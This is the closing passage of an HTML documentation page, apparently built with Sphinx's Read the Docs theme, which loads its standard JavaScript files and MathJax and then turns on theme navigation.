            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  <script type="text/javascript" src="../_static/js/theme.js"></script>

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>